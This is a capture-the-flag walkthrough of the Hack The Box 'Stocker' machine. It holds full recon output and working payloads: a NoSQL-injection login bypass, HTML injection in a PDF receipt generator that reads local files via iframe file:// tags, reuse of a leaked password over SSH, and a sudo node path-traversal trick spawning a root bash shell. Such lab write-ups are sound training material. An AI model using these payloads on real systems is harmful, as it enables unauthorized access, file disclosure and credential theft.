# Hack The Box - Stocker Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.196 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 01:38 EST
Nmap scan report for 10.10.11.196
Host is up (0.25s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE    SERVICE          VERSION
21/tcp    filtered ftp
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp    open     http             nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
256/tcp   filtered fw1-secureremote
2301/tcp  filtered compaqdiag
2492/tcp  filtered groove
8099/tcp  filtered unknown
8888/tcp  filtered sun-answerbook
10566/tcp filtered unknown
32768/tcp filtered filenet-tms
50300/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/5%OT=22%CT=1%CU=44056%PV=Y%DS=2%DC=I%G=Y%TM=63DF4FB5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11
OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.17 seconds
```

So, we got back the results and `` ports open
- Port `22`: running `OpenSSH 8.2p `
- Port `80`: runninng `nginx 1.18.0`
- Ports `21`, `256`, `2301`, etc were all filtered ports. 


Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ rustscan -a 10.10.11.196 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.196:22
Open 10.10.11.196:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.196

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 01:44 EST
Initiating Ping Scan at 01:44
Scanning 10.10.11.196 [2 ports]
Completed Ping Scan at 01:44, 0.13s elapsed (1 total hosts)
Initiating Connect Scan at 01:44
Scanning stocker.htb (10.10.11.196) [2 ports]
Discovered open port 80/tcp on 10.10.11.196
Discovered open port 22/tcp on 10.10.11.196
Completed Connect Scan at 01:44, 0.37s elapsed (2 total ports)
Nmap scan report for stocker.htb (10.10.11.196)
Host is up, received syn-ack (0.17s latency).
Scanned at 2023-02-05 01:44:00 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

So, now that it was confirmed that only 2 ports were open, I could move on with the enumeration.

## Enumeration
Firstly, as `nmap` results showed that on port `80`, I was being redirected to `http://stocker.htb`, I decided to add the host to `/etc/hosts`

```
sudo echo "10.10.11.196  stocker.htb" >> /etc/hosts
```

I tried to ping it, to see if its working and it is working.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ ping -c 1  stocker.htb
PING stocker.htb (10.10.11.196) 56(84) bytes of data.
64 bytes from stocker.htb (10.10.11.196): icmp_seq=1 ttl=63 time=128 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 127.643/127.643/127.643/0.000 ms
```

Now I used `whatweb` to look at what services were running on the web-page.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ whatweb http://stocker.htb
http://stocker.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], Meta-Author[Holger Koenemann], MetaGenerator[Eleventy v2.0.0], Script, Title[Stock - Coming Soon!], nginx[1.18.0]
```

Then, I visited the web-page.

![stk-1](https://user-images.githubusercontent.com/87711310/216814560-ec913f10-07c6-4918-8b6f-9757e59b5953.png)

Notice this one user that was displayed on the web-page as the head of IT service, his name might be useful at the later stages.

Then, I ran `gobuster` to enumerate sub-domains.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ gobuster vhost -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -t 30 -u stocker.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://stocker.htb
[+] Method:       GET
[+] Threads:      30
[+] Wordlist:     /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/05 01:55:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
                                               
===============================================================
2023/02/05 02:04:43 Finished
===============================================================
```

Now that I've found another subdomain, I added it in the `/etc/hosts` file.

```
10.10.11.196  stocker.htb dev.stocker.htb
```

I tried to ping it, to see if its working and it is working.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ ping -c 1 dev.stocker.htb
PING stocker.htb (10.10.11.196) 56(84) bytes of data.
64 bytes from stocker.htb (10.10.11.196): icmp_seq=1 ttl=63 time=123 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.263/123.263/123.263/0.000 ms
```

Using `cURL` to check out the `dev.stocker.htb`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ curl http://dev.stocker.htb                                                                              
Found. Redirecting to /login   
```

So, I visited the `http://dev.stocker.htb`, and this is what it looked like.

![stk-2](https://user-images.githubusercontent.com/87711310/216814564-861afc88-c4c7-4770-93f3-4b4081f3a78c.png)

Trying common/default credentials did not work, so I decided to use `Burp` to intercept the request.

![stk-3](https://user-images.githubusercontent.com/87711310/216814566-38b49c83-b471-4cce-bfb9-7e1aa9860a6a.png)


Now, I thought of using SQL-Injection to bypass the login form. I used various payloads from [here](https://github.com/payloadbox/sql-injection-payload-list), but none seem to work.

So, I decided to run `whatweb` (or you can also use `Wappalyzer`) to look at the tech stack used to develop the webpage.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Stocker]
└─$ whatweb http://dev.stocker.htb 
http://dev.stocker.htb [302 Found] Cookies[connect.sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.196], RedirectLocation[/login], X-Powered-By[Express], nginx[1.18.0]
http://dev.stocker.htb/login [200 OK] Bootstrap, Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.196], Meta-Author[Mark Otto, Jacob Thornton, and Bootstrap contributors], MetaGenerator[Hugo 0.84.0], PasswordField[password], Script, Title[Stockers Sign-in], X-Powered-By[Express], nginx[1.18.0]
```

Now, that I know the website runs on `Express` framework and it mostly uses `MongoDB` as the database, I decided to try and use NoSQL Injection to see if I could bypass the login form

I used [Hacktrick's NoSql-injection payloads](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) to try some payloads   

I started with this basic `JSON` payload, and to do that I also needed to change the `Content-Type` to `application/json`

```
POST /login HTTP/1.1

Host: dev.stocker.htb

...[snip]...

Content-Type: application/json

Content-Length: 24

Origin: http://dev.stocker.htb

Connection: close

Referer: http://dev.stocker.htb/login

...[snip]...

{"username": {"$ne": null}, "password": {"$ne": null} }
```

As soon as I sent the request, I was redirected to `/stock` page

![stk-4](https://user-images.githubusercontent.com/87711310/216814690-2d777376-0822-4fc5-ab1d-420d4c2dee0c.png)

## Gaining Initial Foothold
Now that I was logged in, I decided to check out the page, which looked like a e-commerce website where I was able to add items to cart and also checkout with a receipt generated at the end.

![stk-5](https://user-images.githubusercontent.com/87711310/216814691-db817b7d-4683-446d-8f48-61506e40d66f.png)

I added an `axe` to the cart.

![stk-6](https://user-images.githubusercontent.com/87711310/216814694-7c175c87-17e5-4322-ba5b-31cc35931180.png)

The `view cart` button showed me the items that were in my cart.

Once, I clicked `submit purchase`, I got the following message.

![stk-7](https://user-images.githubusercontent.com/87711310/216814695-fc84f0b6-c7ba-4277-a54d-b7af69591594.png)

I could also see the receipt that the site had generated after purchase confirmation.

![stk-8](https://user-images.githubusercontent.com/87711310/216814720-20bdde71-f356-4874-83cc-cdb5dd2d11f6.png)

I think that `Submit Purchase` is something that we're supposed to exploit, I wasn't sure but I decided to give it a try.

I went to `Burp` and intercepted the request.

![stk-9](https://user-images.githubusercontent.com/87711310/216814726-7b79eabf-a22a-46cf-a27b-80b49197ef81.png)

Now, I noticed a few things:
- The order ID was changing after every order, as it would in a function website. So ig its normal.
- The title seemed kinda odd to me, as it was just a name of the product 
- The price tage was also no different

So, I checked whether I could change the value of these parameter and get away with it.

![stk-10](https://user-images.githubusercontent.com/87711310/216814731-b1de00e2-6732-4e97-b812-98227ea438fd.png)


Now as you can see that I was able to manipulate the price of the product to whatever I wanted.

Apart from that you can also notice the purchaser's name in the top right corner of the receipt.
```angoose```

Now, I decied to test the `title` parameter

```
{
 "basket":[
    {
       "_id":"638f116eeb060210cbd83a91",
       "title":"Axe <h1>Test</h1>"
       "description":"It's an axe.",
       "image":"axe.jpg",
       "price":0,
       "currentStock":21,
       "__v":0,
       "amount":1
     }
  ]
}
```

And I viewed the receipt.

![stk-11](https://user-images.githubusercontent.com/87711310/216814742-f34c84fd-7209-4d7f-a33e-56dec5353e2e.png)


So, now it was confirmed that I was able to inject HTML code inside the `title` parameter.

After googling how to exploit `json` with `HTML Injection` I found out [this blog](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f), where you can escalate from simple HTML injection to SSRF leading to local file read on the server.

The exploit is simple, you just need to check for HTML Injection and if it works you can escalate to SSRF using HTML tags. If successfully exploitable, we can read the local server's files using the `file://` parameter.

Testing if I can read files of local server.
```
<iframe src=file:///etc/passwd></iframe>
```

The request i sent was

![stk-12](https://user-images.githubusercontent.com/87711310/216814744-13df632c-fda5-49e9-a621-30fad9e3721f.png)


Once the request was sent, I looked at receipt's pdf and got back the contents of `/etc/passwd` 

![stk-13](https://user-images.githubusercontent.com/87711310/216814747-4debfb86-9da2-4f57-a879-ecabca4f2f39.png)


Now that I was able to read files on the local server, i decided to look at the `index.js` file which resides at `/var/www/dev/index.js`

Since the 
```
"title":"<iframe src=file:///var/www/dev/index.js height=800px width=800px></iframe>",
```

![stk-14](https://user-images.githubusercontent.com/87711310/216814767-79783ce8-6a0e-48fd-b6e7-091515c2e2f4.png)


I looked at the receipt generated and found a password (I guess). Now that I have a username `angoose` and a password `IHeardPassphrasesArePrettySecure`, i wanted to check if I was able to login to SSH usign these credentials.

```
┌──(darshan㉿kali)-[~]
└─$ ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.196' (ED25519) to the list of known hosts.
angoose@10.10.11.196's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ pwd
/home/angoose
```

And I was able to login!!

Grabbing the user flag.

```
angoose@stocker:~$ pwd
/home/angoose
angoose@stocker:~$ ls
user.txt
angoose@stocker:~$ cat user.txt 
[REDACTED]
```

## Privilege Escalation
I ran `sudo -l` to look at the files/services that I can run as `root`

```
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Sorry, try again.
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

So now, I decided to create a `pwn.js` file inside that `/usr/local/scripts/` directory and the file would contain the following payload to create shell as a `root`

```javascript
const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]})
```

Now, I got an error saying I cannot create files in this directory.

```
angoose@stocker:/usr/local/scripts$ echo 'const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]})' > pwn.js
-bash: pwn.js: Permission denied
```

So, I decided to go to `/tmp` directory and run the file from there.

```
angoose@stocker:/usr/local/scripts$ cd /tmp
angoose@stocker:/tmp$ echo 'const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]})' > pwn.js
angoose@stocker:/tmp$ sudo node /usr/local/scripts/../../../../../tmp/pwn.js
```

Once I ran this, I immediately became root.

```
angoose@stocker:/tmp$ echo 'const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]})' > pwn.js
angoose@stocker:/tmp$ sudo node /usr/local/scripts/../../../../../tmp/pwn.js
root@stocker:/tmp# whoami
root
```

Grabbing the root flag.

```
root@stocker:/tmp# cat /root/root.txt
[REDACTED]
```

